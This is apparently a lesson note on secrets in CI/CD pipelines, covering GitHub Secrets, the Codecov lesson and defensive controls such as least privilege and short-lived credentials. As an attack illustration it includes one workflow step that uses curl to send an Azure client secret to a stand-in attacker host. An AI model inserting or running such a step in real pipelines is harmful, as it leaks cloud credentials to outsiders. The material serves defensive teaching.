# Week 4 Day 18 — Pipeline Secrets

## Goal

Understand how secrets are handled in CI/CD pipelines, why they are high-risk targets, and how attackers abuse them during pipeline execution.

---

# What are Pipeline Secrets?

Pipeline secrets are sensitive values used during CI/CD execution, such as:

- API keys
- Cloud credentials
- Database passwords
- GitHub tokens
- Terraform tokens

Pipelines require secrets in order to:

- Authenticate to cloud platforms
- Deploy infrastructure
- Access external services and APIs

---

# Hardcoded Secrets vs Pipeline Secrets

## Bad Practice — Hardcoded Secret

```yaml
password: "SuperSecret123"
```

### Risk

- Secret stored directly in code
- Easily exposed through source control
- Especially dangerous in public repositories

---

## Better Practice — GitHub Secrets

```yaml
env:
  AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
```

### Benefits

- Secret stored outside repository
- Injected securely during runtime
- Reduces accidental exposure in source control

---

# Critical Security Insight

Secrets are protected at rest, but exposed during execution.

Even if secrets are securely stored:

- The pipeline still requires access to them at runtime
- Malicious code running inside the pipeline may also access them

---

# Why Pipelines are High-Value Targets

Pipelines often have:

- Access to secrets
- Deployment permissions
- Trusted execution environments
- Access to production infrastructure

If a pipeline is compromised, attackers may:

- Steal secrets
- Access cloud infrastructure
- Modify deployments
- Deploy malicious resources
- Create persistence

---

# Example Attack Scenario

Attacker modifies workflow YAML:

```yaml
- name: Steal Secret
  run: curl http://attacker.com?token=$AZURE_CLIENT_SECRET
```

### Result

- Pipeline executes normally
- Secret is exfiltrated to attacker-controlled infrastructure

---

# Key Lesson from Codecov

Attackers do not always attack secret storage directly.

Instead, they target:

- Trusted scripts
- Pipeline execution
- Runtime environments

This allows them to steal secrets during execution.

---

# Key Principle

If an attacker controls execution, they may control secrets.

---

# Security Controls

## 1. Never Hardcode Secrets

Secrets must never be stored directly in source code.

---

## 2. Use Secret Management Systems

Examples:

- GitHub Secrets
- Azure Key Vault
- HashiCorp Vault

---

## 3. Restrict Pipeline Permissions

Use least privilege to reduce blast radius if secrets are compromised.

---

## 4. Use Short-Lived Credentials

### Advantages

- Tokens expire quickly
- Limits attacker access duration
- Reduces persistence opportunities

---

## 5. Protect Workflow Files

Restrict who can modify:

```text
.github/workflows/*
```

Because modifying workflow YAML may allow attackers to:

- Execute malicious commands
- Steal secrets
- Alter deployments

---

## 6. Monitor Pipeline Activity

Watch for:

- Unexpected outbound traffic
- Suspicious commands
- Unusual secret usage

---

# Important Mindset Shift

## Beginner Thinking

"Where are secrets stored?"

## Security Engineer Thinking

"How can secrets be abused during execution?"

---

# Takeaway

Secrets are not secure simply because they are hidden.

They must also be:

- Controlled
- Monitored
- Scoped
- Short-lived
- Protected during execution